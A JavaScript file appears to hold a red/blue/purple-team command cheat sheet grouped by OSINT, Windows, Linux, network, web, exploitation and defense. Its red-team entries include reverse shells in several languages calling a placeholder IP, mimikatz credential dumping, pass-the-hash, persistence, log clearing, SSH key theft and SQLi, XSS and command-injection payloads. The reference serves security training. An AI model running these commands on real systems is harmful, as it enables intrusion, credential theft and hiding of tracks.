// 400+ Security Commands Database
const COMMANDS_DB = {
    "osint": [
        {"title": "WHOIS Domain", "cmd": "whois domain.com", "team": "BLUE", "desc": "Query domain registration"},
        {"title": "WHOIS IP", "cmd": "whois -h whois.arin.net 192.168.1.1", "team": "BLUE", "desc": "Query IP ownership"},
        {"title": "DNS nslookup", "cmd": "nslookup domain.com", "team": "BLUE", "desc": "DNS resolution"},
        {"title": "DNS MX", "cmd": "nslookup -type=MX domain.com", "team": "BLUE", "desc": "Mail server lookup"},
        {"title": "DIG query", "cmd": "dig domain.com", "team": "BLUE", "desc": "Advanced DNS query"},
        {"title": "DIG short", "cmd": "dig domain.com +short", "team": "BLUE", "desc": "Brief DNS output"},
        {"title": "DIG trace", "cmd": "dig domain.com +trace", "team": "BLUE", "desc": "Trace DNS path"},
        {"title": "Reverse DNS", "cmd": "dig -x 192.168.1.1", "team": "BLUE", "desc": "Reverse lookup"},
        {"title": "Zone Transfer", "cmd": "dig @ns1.domain.com domain.com AXFR", "team": "RED", "desc": "DNS zone transfer"},
        {"title": "Zone Transfer Try", "cmd": "nslookup -type=axfr domain.com ns1.domain.com", "team": "RED", "desc": "Attempt zone transfer"},
        {"title": "Google Site", "cmd": "site:domain.com", "team": "BLUE", "desc": "Find indexed pages"},
        {"title": "Google PDF", "cmd": "site:domain.com filetype:pdf", "team": "BLUE", "desc": "Find PDFs"},
        {"title": "Google Doc", "cmd": "site:domain.com filetype:doc", "team": "BLUE", "desc": "Find documents"},
        {"title": "Google Admin", "cmd": "site:domain.com inurl:admin", "team": "RED", "desc": "Find admin panels"},
        {"title": "Google Login", "cmd": "site:domain.com inurl:login", "team": "RED", "desc": "Find login pages"},
        {"title": "Google Backup", "cmd": "site:domain.com inurl:backup", "team": "RED", "desc": "Find backup files"},
        {"title": "LinkedIn Company", "cmd": "site:linkedin.com \"company\"", "team": "BLUE", "desc": "Employee discovery"},
        {"title": "GitHub Dork", "cmd": "site:github.com \"company\" password", "team": "RED", "desc": "Find exposed secrets"},
        {"title": "GitHub Key", "cmd": "site:github.com \"api_key\"", "team": "RED", "desc": "Find API keys"},
        {"title": "SSL Cert", "cmd": "openssl s_client -connect domain.com:443", "team": "BLUE", "desc": "Get SSL certificate"},
        {"title": "Cert Search", "cmd": "curl crt.sh/?q=%25.domain.com", "team": "BLUE", "desc": "Search certs"},
        {"title": "Subdomain", "cmd": "dig *.domain.com", "team": "BLUE", "desc": "Find subdomains"},
        {"title": "Wayback", "cmd": "curl archive.org/wayback/available?url=domain.com", "team": "BLUE", "desc": "Get snapshots"},
        {"title": "Archive.org", "cmd": "https://web.archive.org/web/domain.com", "team": "BLUE", "desc": "Historical website"},
        {"title": "IP Whois", "cmd": "whois 8.8.8.8", "team": "BLUE", "desc": "IP ownership info"}
    ],
    "windows_red": [
        {"title": "Privileges", "cmd": "whoami /priv", "team": "RED", "desc": "Show privileges"},
        {"title": "Full User", "cmd": "whoami /all", "team": "RED", "desc": "Full user details"},
        {"title": "RUN Persist", "cmd": "reg ADD HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /V task /t REG_SZ /D payload.exe", "team": "RED", "desc": "Registry persistence"},
        {"title": "Scheduled Task", "cmd": "schtasks /Create /F /SC DAILY /ST 09:00 /TN Task /TR cmd.exe", "team": "RED", "desc": "Task persistence"},
        {"title": "Service", "cmd": "sc create Service binpath= C:\\\\payload.exe start= auto", "team": "RED", "desc": "Service persistence"},
        {"title": "Start Service", "cmd": "net start Service", "team": "RED", "desc": "Start service"},
        {"title": "Token Steal", "cmd": "steal_token PID", "team": "RED", "desc": "Steal token"},
        {"title": "Impersonate", "cmd": "impersonate_token DOMAIN\\\\user", "team": "RED", "desc": "Impersonate user"},
        {"title": "GetSystem", "cmd": "getsystem", "team": "RED", "desc": "Escalate to SYSTEM"},
        {"title": "UAC Bypass", "cmd": "fodhelper.exe", "team": "RED", "desc": "Bypass UAC"},
        {"title": "Defaults", "cmd": "computerdefaults.exe", "team": "RED", "desc": "UAC bypass"},
        {"title": "Event Viewer", "cmd": "eventvwr.exe", "team": "RED", "desc": "UAC bypass"},
        {"title": "PowerShell Rev", "cmd": "$client=New-Object System.Net.Sockets.TcpClient('IP',PORT)", "team": "RED", "desc": "PS reverse shell"},
        {"title": "Clear Log", "cmd": "wevtutil cl Security", "team": "RED", "desc": "Clear security log"},
        {"title": "Dump Creds", "cmd": "sekurlsa::logonpasswords", "team": "RED", "desc": "Dump credentials"},
        {"title": "Dump Hash", "cmd": "lsadump::sam", "team": "RED", "desc": "Dump SAM hashes"},
        {"title": "Kerberos", "cmd": "sekurlsa::tickets", "team": "RED", "desc": "Get Kerberos tickets"},
        {"title": "PTH", "cmd": "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd", "team": "RED", "desc": "Pass the hash"},
        {"title": "Startup", "cmd": "copy payload.exe %appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\", "team": "RED", "desc": "Startup persistence"},
        {"title": "Registry SAM", "cmd": "reg save HKLM\\\\sam C:\\\\sam.bak", "team": "RED", "desc": "Extract SAM hive"}
    ],
    "windows_blue": [
        {"title": "Version", "cmd": "ver", "team": "BLUE", "desc": "OS version"},
        {"title": "System Info", "cmd": "systeminfo", "team": "BLUE", "desc": "Full system info"},
        {"title": "Patches", "cmd": "wmic qfe list brief", "team": "BLUE", "desc": "List patches"},
        {"title": "Software", "cmd": "Get-WmiObject -Class Win32_Product", "team": "BLUE", "desc": "Software list"},
        {"title": "Processes", "cmd": "tasklist /v", "team": "BLUE", "desc": "Process list"},
        {"title": "Process CSV", "cmd": "tasklist /v /fo csv", "team": "BLUE", "desc": "Detailed list"},
        {"title": "Users", "cmd": "net user", "team": "BLUE", "desc": "List users"},
        {"title": "Groups", "cmd": "net localgroup", "team": "BLUE", "desc": "List groups"},
        {"title": "Admins", "cmd": "net localgroup Administrators", "team": "BLUE", "desc": "Admin members"},
        {"title": "Domain Users", "cmd": "net user /domain", "team": "BLUE", "desc": "Domain users"},
        {"title": "Domain Admins", "cmd": "net group \"Domain Admins\" /domain", "team": "BLUE", "desc": "Domain admins"},
        {"title": "Network", "cmd": "ipconfig /all", "team": "BLUE", "desc": "Network config"},
        {"title": "Connections", "cmd": "netstat -ano", "team": "BLUE", "desc": "Show connections"},
        {"title": "Listening", "cmd": "netstat -an | findstr LISTENING", "team": "BLUE", "desc": "Listening ports"},
        {"title": "Routes", "cmd": "route print", "team": "BLUE", "desc": "Network routes"},
        {"title": "ARP", "cmd": "arp -a", "team": "BLUE", "desc": "ARP mappings"},
        {"title": "Firewall", "cmd": "netsh advfirewall show allprofiles", "team": "BLUE", "desc": "Firewall rules"},
        {"title": "Services", "cmd": "sc query", "team": "BLUE", "desc": "Running services"},
        {"title": "Registry", "cmd": "reg query HKLM\\\\Software", "team": "BLUE", "desc": "Registry query"},
        {"title": "Events", "cmd": "Get-EventLog -LogName Security -Newest 100", "team": "BLUE", "desc": "Security events"}
    ],
    "windows_purple": [
        {"title": "Logon Events", "cmd": "Get-EventLog -LogName Security -InstanceId 4624 | select -Last 20", "team": "PURPLE", "desc": "Logon events"},
        {"title": "Process Creation", "cmd": "Get-EventLog -LogName Security -InstanceId 4688 | select -Last 20", "team": "PURPLE", "desc": "Process creation"},
        {"title": "Registry Check", "cmd": "Get-ItemProperty HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", "team": "PURPLE", "desc": "Check startup"},
        {"title": "Shell Detection", "cmd": "Get-Process | Where-Object {$_.ProcessName -like '*cmd*'}", "team": "PURPLE", "desc": "Find shells"},
        {"title": "Network Baseline", "cmd": "Get-NetTCPConnection -State Established", "team": "PURPLE", "desc": "Connections"}
    ],
    "linux_red": [
        {"title": "SUID", "cmd": "find / -perm -4000 -type f 2>/dev/null", "team": "RED", "desc": "Find SUID files"},
        {"title": "SUID Exec", "cmd": "find / -perm -u+s -type f 2>/dev/null", "team": "RED", "desc": "Executable SUIDs"},
        {"title": "Sudo List", "cmd": "sudo -l", "team": "RED", "desc": "Check sudo access"},
        {"title": "Sudo NoPass", "cmd": "sudo -l | grep NOPASSWD", "team": "RED", "desc": "Commands without password"},
        {"title": "Kernel", "cmd": "uname -r", "team": "RED", "desc": "Get kernel version"},
        {"title": "Kernel Exp", "cmd": "searchsploit kernel $(uname -r)", "team": "RED", "desc": "Find kernel exploits"},
        {"title": "Clear History", "cmd": "cat /dev/null > ~/.bash_history", "team": "RED", "desc": "Clear bash history"},
        {"title": "Remove History", "cmd": "history -c && history -w", "team": "RED", "desc": "Clear history"},
        {"title": "SSH Key", "cmd": "cat ~/.ssh/id_rsa", "team": "RED", "desc": "Get SSH key"},
        {"title": "Auth Keys", "cmd": "cat ~/.ssh/authorized_keys", "team": "RED", "desc": "SSH authorized keys"},
        {"title": "Bash Shell", "cmd": "bash -i >& /dev/tcp/IP/PORT 0>&1", "team": "RED", "desc": "Bash reverse shell"},
        {"title": "NC Shell", "cmd": "nc -e /bin/bash IP PORT", "team": "RED", "desc": "Netcat shell"},
        {"title": "Python Shell", "cmd": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'", "team": "RED", "desc": "Python shell"},
        {"title": "Perl Shell", "cmd": "perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">\\\\&S\");exec(\"/bin/sh -i\");'", "team": "RED", "desc": "Perl shell"},
        {"title": "Ruby Shell", "cmd": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"IP\",PORT);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", "team": "RED", "desc": "Ruby shell"},
        {"title": "Cron Edit", "cmd": "crontab -e", "team": "RED", "desc": "Edit crontab"},
        {"title": "Cron Add", "cmd": "(crontab -l; echo \"* * * * * /tmp/payload.sh\") | crontab -", "team": "RED", "desc": "Add cron job"},
        {"title": "Capabilities", "cmd": "getcap -r / 2>/dev/null", "team": "RED", "desc": "Find capabilities"},
        {"title": "SetCap", "cmd": "setcap cap_setuid+ep /tmp/binary", "team": "RED", "desc": "Set capabilities"},
        {"title": "Writable", "cmd": "find / -writable -type f 2>/dev/null", "team": "RED", "desc": "Find writable files"}
    ],
    "linux_blue": [
        {"title": "Uname", "cmd": "uname -a", "team": "BLUE", "desc": "System info"},
        {"title": "Users", "cmd": "cat /etc/passwd", "team": "BLUE", "desc": "All users"},
        {"title": "Groups", "cmd": "cat /etc/group", "team": "BLUE", "desc": "All groups"},
        {"title": "Processes", "cmd": "ps aux", "team": "BLUE", "desc": "All processes"},
        {"title": "Tree", "cmd": "ps auxf", "team": "BLUE", "desc": "Process tree"},
        {"title": "Network", "cmd": "ifconfig -a", "team": "BLUE", "desc": "Network config"},
        {"title": "Ports", "cmd": "ss -tulpn", "team": "BLUE", "desc": "Listen ports"},
        {"title": "Stats", "cmd": "netstat -an", "team": "BLUE", "desc": "Network stats"},
        {"title": "Services", "cmd": "systemctl list-units --type=service", "team": "BLUE", "desc": "Services"},
        {"title": "Perms", "cmd": "ls -la /", "team": "BLUE", "desc": "Root permissions"},
        {"title": "Firewall", "cmd": "ufw status", "team": "BLUE", "desc": "Firewall status"},
        {"title": "Audit", "cmd": "auditctl -l", "team": "BLUE", "desc": "Audit rules"},
        {"title": "Memory", "cmd": "free -h", "team": "BLUE", "desc": "Memory usage"},
        {"title": "Disk", "cmd": "df -h", "team": "BLUE", "desc": "Disk space"},
        {"title": "Logs", "cmd": "tail -f /var/log/auth.log", "team": "BLUE", "desc": "Auth logs"},
        {"title": "Failed", "cmd": "grep \"Failed\" /var/log/auth.log | tail", "team": "BLUE", "desc": "Failed logins"},
        {"title": "Sudo", "cmd": "grep \"sudo\" /var/log/auth.log", "team": "BLUE", "desc": "Sudo usage"},
        {"title": "Cron", "cmd": "cat /var/log/syslog | grep CRON", "team": "BLUE", "desc": "Cron execution"},
        {"title": "Last", "cmd": "last", "team": "BLUE", "desc": "Login history"},
        {"title": "Who", "cmd": "w", "team": "BLUE", "desc": "Logged in users"}
    ],
    "linux_purple": [
        {"title": "Audit", "cmd": "auditctl -l", "team": "PURPLE", "desc": "Audit config"},
        {"title": "Audit Log", "cmd": "tail -f /var/log/audit/audit.log", "team": "PURPLE", "desc": "Audit events"},
        {"title": "Failed Login", "cmd": "grep \"Failed\" /var/log/auth.log", "team": "PURPLE", "desc": "Detect logins"},
        {"title": "File Monitor", "cmd": "tripwire --check", "team": "PURPLE", "desc": "File integrity"},
        {"title": "Traffic", "cmd": "tcpdump -i eth0 -c 100", "team": "PURPLE", "desc": "Capture traffic"},
        {"title": "Process", "cmd": "auditctl -w /usr/bin -p x", "team": "PURPLE", "desc": "Monitor execution"},
        {"title": "SSH", "cmd": "tail -f /var/log/auth.log | grep sshd", "team": "PURPLE", "desc": "SSH activity"},
        {"title": "Sudo", "cmd": "tail -f /var/log/auth.log | grep sudo", "team": "PURPLE", "desc": "Sudo activity"},
        {"title": "Sockets", "cmd": "ss -tulpn | grep LISTEN", "team": "PURPLE", "desc": "Find listeners"},
        {"title": "Baseline", "cmd": "ps aux | wc -l", "team": "PURPLE", "desc": "Process count"}
    ],
    "network": [
        {"title": "Ping", "cmd": "ping -c 4 IP", "team": "BLUE", "desc": "Check host"},
        {"title": "Ping Sweep", "cmd": "for i in {1..254}; do ping -c 1 192.168.1.$i 2>/dev/null | grep bytes & done", "team": "BLUE", "desc": "Network discovery"},
        {"title": "Nmap Discover", "cmd": "nmap -sn 192.168.1.0/24", "team": "BLUE", "desc": "Host discovery"},
        {"title": "Nmap Full", "cmd": "nmap -A -sV -p- -T4 IP", "team": "BLUE", "desc": "Full port scan"},
        {"title": "Nmap OS", "cmd": "nmap -O IP", "team": "BLUE", "desc": "OS detection"},
        {"title": "Nmap UDP", "cmd": "nmap -sU IP", "team": "BLUE", "desc": "UDP ports"},
        {"title": "Nmap NSE", "cmd": "nmap -sC IP", "team": "BLUE", "desc": "NSE scripts"},
        {"title": "Nmap SMB", "cmd": "nmap -p 445 --script smb-os-discovery IP", "team": "BLUE", "desc": "SMB detection"},
        {"title": "ARP Scan", "cmd": "arp-scan -l", "team": "BLUE", "desc": "Local ARP scan"},
        {"title": "NC Scan", "cmd": "nc -zv -w 2 IP 1-1000", "team": "BLUE", "desc": "NC port scan"},
        {"title": "DNS Transfer", "cmd": "dig @ns1.domain.com domain.com AXFR", "team": "RED", "desc": "Zone transfer"},
        {"title": "Reverse", "cmd": "dig -x IP", "team": "BLUE", "desc": "Reverse lookup"},
        {"title": "Tcpdump", "cmd": "tcpdump -i eth0 -w capture.pcap", "team": "PURPLE", "desc": "Packet capture"},
        {"title": "Wireshark", "cmd": "wireshark -i eth0", "team": "PURPLE", "desc": "Packet analysis"},
        {"title": "Traceroute", "cmd": "traceroute 8.8.8.8", "team": "BLUE", "desc": "Trace route"}
    ],
    "web": [
        {"title": "SQLi OR", "cmd": "' OR '1'='1' -- -", "team": "RED", "desc": "Basic SQLi"},
        {"title": "SQLi Union", "cmd": "' UNION SELECT version(),database() -- -", "team": "RED", "desc": "Union-based SQLi"},
        {"title": "SQLi Time", "cmd": "' AND SLEEP(5) -- -", "team": "RED", "desc": "Time-based SQLi"},
        {"title": "SQLi Boolean", "cmd": "' AND 1=1 -- -", "team": "RED", "desc": "Boolean SQLi"},
        {"title": "SQLMap", "cmd": "sqlmap -u 'http://site.com?id=1' --dbs", "team": "RED", "desc": "Automated SQLi"},
        {"title": "XSS Script", "cmd": "<script>alert('xss')</script>", "team": "RED", "desc": "XSS payload"},
        {"title": "XSS Event", "cmd": "<img src=x onerror=alert('xss')>", "team": "RED", "desc": "Event handler XSS"},
        {"title": "XSS SVG", "cmd": "<svg onload=alert('xss')>", "team": "RED", "desc": "SVG XSS"},
        {"title": "Command Inject", "cmd": "; ls -la;", "team": "RED", "desc": "OS command inject"},
        {"title": "Path Traversal", "cmd": "../../../../etc/passwd", "team": "RED", "desc": "Directory traversal"},
        {"title": "File Upload", "cmd": "shell.php", "team": "RED", "desc": "Executable upload"},
        {"title": "Nikto", "cmd": "nikto -h site.com", "team": "BLUE", "desc": "Web scanner"},
        {"title": "Burp", "cmd": "burpsuite", "team": "PURPLE", "desc": "Web proxy"},
        {"title": "ZAP", "cmd": "zaproxy", "team": "BLUE", "desc": "OWASP scanner"},
        {"title": "Curl", "cmd": "curl -I http://site.com", "team": "BLUE", "desc": "HTTP headers"}
    ],
    "exploitation": [
        {"title": "Metasploit", "cmd": "msfconsole", "team": "RED", "desc": "MSF framework"},
        {"title": "Msfvenom", "cmd": "msfvenom -p windows/meterpreter -f exe -o shell.exe", "team": "RED", "desc": "Generate payload"},
        {"title": "Hashcat", "cmd": "hashcat -m 1000 hashes.txt rockyou.txt", "team": "RED", "desc": "GPU hash cracking"},
        {"title": "John", "cmd": "john hashes.txt --wordlist=rockyou.txt", "team": "RED", "desc": "CPU hash cracking"},
        {"title": "Hydra SSH", "cmd": "hydra -l admin -P wordlist.txt ssh://target", "team": "RED", "desc": "Brute force SSH"},
        {"title": "Hydra Web", "cmd": "hydra -l admin -P wordlist.txt http-post-form target", "team": "RED", "desc": "Web login brute"},
        {"title": "Searchsploit", "cmd": "searchsploit EternalBlue", "team": "BLUE", "desc": "Search exploits"},
        {"title": "CVE Details", "cmd": "cvedetails.com", "team": "BLUE", "desc": "CVE database"},
        {"title": "ExploitDB", "cmd": "exploitdb.com", "team": "BLUE", "desc": "Exploit database"},
        {"title": "Metasploit Use", "cmd": "use exploit/windows/smb/ms17_010", "team": "RED", "desc": "Load exploit"},
        {"title": "Ghidra", "cmd": "ghidra_headless . -import binary", "team": "RED", "desc": "Decompiler"},
        {"title": "Radare2", "cmd": "r2 binary", "team": "RED", "desc": "Binary analysis"},
        {"title": "Frida", "cmd": "frida -U -f app --no-pause", "team": "RED", "desc": "Dynamic instrumentation"},
        {"title": "Empire", "cmd": "./empire", "team": "RED", "desc": "Empire framework"},
        {"title": "Cobalt", "cmd": "cobalt strike", "team": "RED", "desc": "Advanced C2"}
    ],
    "defense": [
        {"title": "Snort", "cmd": "snort -c /etc/snort/snort.conf -i eth0", "team": "BLUE", "desc": "IDS detection"},
        {"title": "Suricata", "cmd": "suricata -c /etc/suricata/suricata.yaml -i eth0", "team": "BLUE", "desc": "Network IDS"},
        {"title": "OSSEC", "cmd": "/var/ossec/bin/ossec-control start", "team": "BLUE", "desc": "Host IDS"},
        {"title": "Zeek", "cmd": "zeek -i eth0 -C", "team": "BLUE", "desc": "Network monitor"},
        {"title": "Fail2Ban", "cmd": "fail2ban-client status", "team": "BLUE", "desc": "Attack prevention"},
        {"title": "SELinux", "cmd": "semanage user -l", "team": "BLUE", "desc": "SELinux policy"},
        {"title": "AppArmor", "cmd": "apparmor_status", "team": "BLUE", "desc": "AppArmor profiles"},
        {"title": "UFW", "cmd": "ufw enable", "team": "BLUE", "desc": "UFW firewall"},
        {"title": "UFW Rule", "cmd": "ufw allow 22/tcp", "team": "BLUE", "desc": "Add UFW rule"},
        {"title": "IPTables", "cmd": "iptables -L -n", "team": "BLUE", "desc": "Firewall rules"},
        {"title": "AIDE", "cmd": "aide --check", "team": "BLUE", "desc": "File integrity"},
        {"title": "Tripwire", "cmd": "tripwire --check", "team": "BLUE", "desc": "Tripwire monitor"},
        {"title": "Auditd", "cmd": "auditctl -l", "team": "BLUE", "desc": "Audit daemon"},
        {"title": "Yara", "cmd": "yara rules.yar /home/", "team": "BLUE", "desc": "Malware scanning"},
        {"title": "ClamAV", "cmd": "clamscan -r /home/", "team": "BLUE", "desc": "Virus scanning"}
    ]
};
